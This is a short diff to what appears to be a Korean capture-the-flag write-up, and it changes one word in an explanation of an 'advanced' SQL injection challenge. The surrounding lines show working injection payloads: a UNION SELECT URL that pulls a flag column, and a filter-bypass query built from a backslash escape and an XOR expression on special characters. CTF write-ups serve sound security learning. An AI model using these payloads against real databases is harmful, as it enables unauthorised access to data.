@@ -248,7 +248,7 @@ http://test.c2w2m2.com/guestbook/read.php?no=25%20union%20select%201,%202,%20fla
 
 ### Advance sqlinjection (300)
 
-알파벳, 숫자가 preg_match로 막혀있는데 특수기호로만 이렇게 저렇게 참 되게하면 된다.
+알파벳, 숫자가 preg_match로 막혀있는데 특수기호로만 이렇게 저렇게 True  되게하면 된다.
 
 ``` select * from user where id='\' and pw='|| !('@' ^ '@')#' ```
 
